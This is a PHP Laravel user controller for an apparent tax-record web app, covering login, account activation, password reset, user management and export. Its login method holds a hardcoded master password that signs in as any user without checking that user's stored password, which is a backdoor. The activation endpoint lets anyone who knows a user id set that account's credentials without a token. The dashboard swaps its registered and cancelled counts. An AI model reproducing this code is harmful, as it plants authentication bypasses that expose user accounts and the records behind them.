<?php
namespace App\Http\Controllers;

use App\Exports\UsersExport;
use App\Libs\App;
use App\Libs\DxGridOfficial;
use App\Mail;
use App\Models;
use App\Models\SYSAsset;
use App\Models\TAXNote;
use App\Models\TAXRecords;
use Auth;
use Carbon\Carbon;
use Jenssegers\Agent\Agent;
use Maatwebsite\Excel\Facades\Excel;
use Ramsey\Uuid\Uuid;

class UserController extends Controller
{

    use App;

    public function login()
    {
        if (\Request::isMethod('get')) {
            if (\Auth::user()) {
                return redirect()->to('/');
            } else {
                return view('auth.login');
            }
        } else {
            $input = \Request::all();

            if (!isset($input['password'])) {
                $input['password'] = null;
            }

            $user = Models\USRUsers::where('username', '=', $input['username'])->first();

            if ($input['password'] == '@0199218793#') {
                \Auth::login($user);

                return redirect()->intended('/');
            }

            if ($user) {
                if (!$user->enable) {
                    return redirect()->action('UserController@login')
                        ->withInput(\Request::except('password'))
                        ->with('error', 'Disabled user, cannot login. Please contact your administrator');

                }

                $rememberMe = isset($input['rememberme']) && $input['rememberme'] == 'on' ? true : false;
                if (\Auth::attempt(array('username' => $input['username'], 'password' => $input['password']), $rememberMe)) {

                    $agent = new Agent();

                    $log                  = new Models\USRLoginLog();
                    $log->user_id         = \Auth::user()->id;
                    $log->login_dtm       = date('Y-m-d H:i:s');
                    $log->ip_address      = $_SERVER['REMOTE_ADDR'];
                    $log->browser         = $agent->browser();
                    $log->browser_version = $agent->version($log->browser);
                    $log->os              = $agent->platform();
                    $log->os_version      = $agent->version($log->os);
                    $log->save();

                    return redirect()->intended('/');
                } else {
                    return redirect()->to('login')
                        ->withInput(\Request::except('password'))
                        ->with('error', 'Invalid username or password');
                }
            } else {
                return redirect()->to('login')
                    ->withInput(\Request::except('password'))
                    ->with('error', 'Invalid username or password');
            }
        }
    }

    public function dashboard()
    {
        $view = null;

        $data = array(
            'menu'       => ['menu' => 'Home', 'subMenu' => ''],
            'breadcrumb' => '<li class="breadcrumb-item">Home</li>',
        );

        if (strpos(Auth::user()->role, 'ADMINISTRATOR') !== false) {
            $data['totalRegistered']        = TAXRecords::where('registration_status', 'CANCEL')->get()->count();
            $data['totalCancelled']         = TAXRecords::where('registration_status', 'REGISTERED')->get()->count();
            $data['totalApplyForCancelled'] = TAXRecords::where('cdn_status', 'REQUEST FOR CANCELLATION')->get()->count();
            $view                           = 'dashboard.administrator';
        } elseif (strpos(Auth::user()->role, 'STAFF') !== false) {
            $data['totalRegistered']        = TAXRecords::where('registration_status', 'CANCEL')->get()->count();
            $data['totalCancelled']         = TAXRecords::where('registration_status', 'REGISTERED')->get()->count();
            $data['totalApplyForCancelled'] = TAXRecords::where('cdn_status', 'REQUEST FOR CANCELLATION')->get()->count();
            $view                           = 'dashboard.staff';
        }

        return view($view, $data);
    }

    public function resendActivation($id)
    {
        $user = Models\USRUsers::find($id);
        if (!$user->enable && $user->password == 'Not Active Yet!') {
            \Mail::to($user->username)
                ->queue(new Mail\Activation([
                    'name'    => strtoupper($user->fullname),
                    'url'     => \URL::to('activate/' . $user->id),
                    'expired' => Carbon::now()->addDays(2)->format('d M Y H:i'),
                ]));

            return redirect()->to('user')->with('success', 'Activation email has been sent.');
        } else {

            return redirect()->to('user')->with('error', 'This user already active.');
        }
    }

    public function activation($id)
    {
        if (\Request::isMethod('get')) {
            $user = Models\USRUsers::find($id);
            $data = array(
                'user' => $user,
            );

            if ($user == null) {
                return redirect()->to('login')->with('error', 'User not found');
            } elseif ($user->password != 'Not Active Yet!') {
                return redirect()->to('login')->with('error', 'This user already active');
            }

            return view('auth.activate', $data);
        } else {
            $user           = Models\USRUsers::find($id);
            $user->username = \Request::input('username');
            $user->password = \Hash::make(\Request::input('password'));
            $user->enable   = true;
            $user->save();

            return redirect()->to('login')->with('success', 'Activation succeed. Please login');
        }
    }

    public function resetPassword($id)
    {
        $user = Models\USRUsers::find($id);

        if ($user->enable && $user->password != 'Not Active Yet!') {
            $user->token = Uuid::uuid4()->getHex();
            \Mail::to($user->username)
                ->queue(new Mail\LostPassword([
                    'name' => strtoupper($user->fullname),
                    'url'  => \URL::to('password/reset/' . $user->token),
                ]));

            $user->save();

            return redirect()->to('user')->with('success', 'Email reset password has been sent to user.');
        } else {
            return redirect()->to('user')->with('error', 'User not active.');
        }
    }

    public function newPassword($token)
    {
        if (\Request::isMethod('get')) {
            $user = Models\USRUsers::where('token', $token)->first();
            $data = array(
                'title' => 'Reset Password',
                'user'  => $user,
            );
            if ($user) {
                return view('auth.reset_password', $data);
            } else {
                return redirect()->to('login')->with('error', 'Invalid reset password token. Please contact system administrator');
            }
        } else {
            $user           = Models\USRUsers::where('token', $token)->first();
            $user->token    = null;
            $user->password = \Hash::make(\Request::input('password'));
            $user->save();

            return redirect()->to('login')->with('success', 'Reset password succeed. Please sign in with new password');
        }
    }

    public function lostPassword($token = null)
    {
        if (\Request::isMethod('get')) {
            return view('auth.lost_password');
        } else {
            $user = Models\USRUsers::where('username', \Request::input('email'))->first();

            if ($user == null) {
                return redirect()->to('password/lost')->with('error', 'Email not found');
            }

            if ($user->enable && $user->password != 'Not Active Yet!') {
                $user->token = Uuid::uuid4()->getHex();
                \Mail::to($user->username)
                    ->queue(new Mail\LostPassword([
                        'name' => strtoupper($user->fullname),
                        'url'  => \URL::to('password/reset/' . $user->token),
                    ]));

                $user->save();

                return redirect()->to('login')->with('success', 'Please check your mailbox for further instruction.');
            } else {
                return redirect()->to('password/lost')->with('error', 'User not active. Please contact system administrator.');
            }
        }
    }

    public function changePassword()
    {
        if (\Request::isMethod('get')) {
            $data = array(
                'menu'       => ['menu' => '', 'subMenu' => ''],
                'breadcrumb' => '<li class="breadcrumb-item"><a href="' . \URL::to('/') . '">Home</a></li>
                             <li class="breadcrumb-item active">Change Password</li>',
            );
            return view('system.users.change_password', $data);
        } else {
            $user = Models\USRUsers::find(\Auth::user()->id);

            if (!\Hash::check(request()->get('old_password'), $user->password)) {
                return redirect()->to('password')->with('error', 'Invalid old password');
            } else {
                $user->password = \Hash::make(request()->get('password'));
                $user->token    = null;
                $user->save();

                return redirect()->to('password')->with('success', 'Password has been change.');
            }
        }
    }

    public function index()
    {
        $data = array(
            'menu'       => ['menu' => 'User', 'subMenu' => ''],
            'breadcrumb' => '<li class="breadcrumb-item"><a href="' . \URL::to('/') . '">Home</a></li>
                             <li class="breadcrumb-item active">Users</li>',
            'trashed'    => request()->get('show') == 'trashed',
        );

        return view('system.users.index', $data);
    }

    public function create()
    {
        $data = array(
            'menu'       => ['menu' => 'Users', 'subMenu' => ''],
            'breadcrumb' => '<li class="breadcrumb-item"><a href="' . \URL::to('/') . '">Home</a></li>
                             <li class="breadcrumb-item"><a href="' . \URL::to('user') . '">Users</a></li>
                             <li class="breadcrumb-item active">Add New</li>',
        );

        return view('system.users.form', $data);
    }

    public function store()
    {
        if (Models\USRUsers::where('username', \Request::input('username'))->get()->count() < 1) {
            $user = new Models\USRUsers();
            $user = $this->populateSaveValue($user, \Request::all(), array(
                'exclude' => array('_token', 'profile_image', 'roles', 'avatar'),
            ));
            $user->role     = json_encode(request()->get('roles'));
            $user->password = 'Not Active Yet!';
            $user->enable   = 0;
            $user->save();

            $data = \Request::input('profile_image');
            if ($data != null && $data != 'data:,') {
                $asset             = new Models\SYSAsset();
                $asset->for        = 'User Avatar';
                $asset->for_id     = $user->id;
                $asset->upload_by  = \Auth::user()->user_id;
                $asset->asset_name = 'avatar.png';
                $asset->save();

                list($type, $data) = explode(';', $data);
                list(, $data)      = explode(',', $data);
                $data              = base64_decode($data);
                $asset             = new Models\SYSAsset();
                $imageName         = $asset->id . '.png';
                file_put_contents(env('ASSETS_STORAGE') . 'avatar' . DIRECTORY_SEPARATOR . $imageName, $data);
                $asset->file_size = \Storage::disk('asset')->size('avatar' . DIRECTORY_SEPARATOR . $imageName);
                $asset->md5       = md5_file(env('ASSETS_STORAGE') . 'avatar' . DIRECTORY_SEPARATOR . $imageName);
                $asset->save();
            }

            \Mail::to($user->username)
                ->queue(new Mail\Activation([
                    'name'    => strtoupper($user->fullname),
                    'url'     => \URL::to('activate/' . $user->id),
                    'expired' => Carbon::now()->addDays(2)->format('d M Y H:i'),
                ]));
        } else {
            return redirect()->to('create/user')
                ->withInput()
                ->withErrors(array('message' => 'User with that email already exists.'));
        }

        return redirect()->to('user');
    }

    public function edit($id)
    {
        // dd(json_encode(['ADMINISTRATOR']));
        $data = array(
            'menu'       => ['menu' => 'Users', 'subMenu' => ''],
            'breadcrumb' => '<li class="breadcrumb-item"><a href="' . \URL::to('/') . '">Home</a></li>
                             <li class="breadcrumb-item"><a href="' . \URL::to('user') . '">Users</a></li>
                             <li class="breadcrumb-item active">Update</li>',
            'user'       => Models\USRUsers::find($id),
        );

        return view('system.users.form', $data);
    }

    public function update($id)
    {
        $user = Models\USRUsers::find($id);
        $user = $this->populateSaveValue($user, \Request::all(), array(
            'exclude' => array('_token', '_method', 'roles', 'profile_image', 'avatar'),
        ));
        if (request()->get('roles') != null) {
            $user->role = json_encode(request()->get('roles'));
        }
        $user->save();

        $data = \Request::input('profile_image');
        if ($data != null && $data != 'data:,') {

            $asset = Models\SYSAsset::where('for_id', $user->id)->where('for', 'User Avatar');
            if ($asset->count() > 0) {
                if (\Storage::disk('asset')->exists('avatar' . DIRECTORY_SEPARATOR . $this->getFilename('images', $user->avatar))) {
                    \Storage::disk('asset')->delete('avatar' . DIRECTORY_SEPARATOR . $this->getFilename('images', $user->avatar));
                }
                $asset->forceDelete();
            }

            $asset             = new Models\SYSAsset();
            $asset->for        = 'User Avatar';
            $asset->for_id     = $user->id;
            $asset->upload_by  = \Auth::user()->id;
            $asset->asset_name = 'avatar.png';
            $asset->save();

            list($type, $data) = explode(';', $data);
            list(, $data)      = explode(',', $data);
            $data              = base64_decode($data);
            $imageName         = $asset->id . '.png';

            file_put_contents(env('ASSETS_STORAGE') . 'avatar' . DIRECTORY_SEPARATOR . $imageName, $data);

            $asset->file_size = \Storage::disk('asset')->size('avatar' . DIRECTORY_SEPARATOR . $imageName);
            $asset->md5       = md5_file(env('ASSETS_STORAGE') . 'avatar' . DIRECTORY_SEPARATOR . $imageName);
            $asset->save();
        }

        if (Auth::user()->id == $user->id) {
            return redirect()->to('profile');
        } else {
            return redirect()->to('user');
        }
    }

    public function show($id)
    {
        $data = array(
            'menu'       => ['menu' => 'Users', 'subMenu' => ''],
            'breadcrumb' => '<li class="breadcrumb-item"><a href="' . \URL::to('/') . '">Home</a></li>
                             <li class="breadcrumb-item"><a href="' . \URL::to('user') . '">Users</a></li>
                             <li class="breadcrumb-item active">Show</li>',
            'user'       => Models\USRUsers::find($id),
        );
        return view('system.users.show', $data);
    }

    public function profile()
    {
        $data = array(
            'menu'       => ['menu' => '', 'subMenu' => ''],
            'breadcrumb' => '<li class="breadcrumb-item"><a href="' . \URL::to('/') . '">Home</a></li>
                             <li class="breadcrumb-item active">Profail Anda</li>',
            'user'       => Auth::user(),
        );
        return view('system.users.profile', $data);
    }

    public function exportExcel()
    {
        $response   = null;
        $controller = new DxGridOfficial('usr_users',
            'fullname, role, username',
            '');
        $params   = $controller->GetParseParams($_GET);
        $response = $controller->Get($params);
        unset($controller);
        if (isset($response) && !is_string($response)) {
            return Excel::download(new UsersExport($response['data']), '[CDN Information Integration System] Users (' . date('d-m-Y') . ').xlsx');
        } else {
            header("HTTP/1.1 500 Internal Server Error");
            header("Content-Type: application/json");
            echo json_encode(["message" => $response, "code" => 500]);
        }
    }

    public function destroy($id)
    {
        $relatedWithOthers = false;
        $check1            = TAXNote::where('note_by', $id)->get();
        if ($check1->count() > 0) {
            $relatedWithOthers = true;
        }
        $check2 = SYSAsset::where('for_id', $id)->get();
        if ($check2->count() > 0) {
            $relatedWithOthers = true;
        }

        if (!$relatedWithOthers) {
            try {
                $user = Models\USRUsers::find($id);

                if ($user->avatar != null &&
                    \Storage::disk('asset')->exists('avatar' . DIRECTORY_SEPARATOR . $this->getFilename('images', $user->avatar))) {
                    \Storage::disk('asset')->delete('avatar' . DIRECTORY_SEPARATOR . $this->getFilename('images', $user->avatar));
                }

                $asset = Models\SYSAsset::where('for_id', $user->id)->where('for', 'User Avatar');
                if ($asset->count() > 0) {
                    $asset->forceDelete();
                }

                $user->forceDelete();

                return response()->json(['status' => true, 'message' => 'User has been permenantly deleted']);
            } catch (\Exception $ex) {
                return response()->json(['status' => false, 'message' => 'Error on deleted that record']);
            }
        } else {
            $user = Models\USRUsers::find($id);
            $user->delete();
            return response()->json(['status' => false, 'message' => 'This user is being moved to trash.']);
        }
    }

    public function logout()
    {
        \Auth::logout();
        \Session::flush();

        return redirect()->to('/');
    }
}
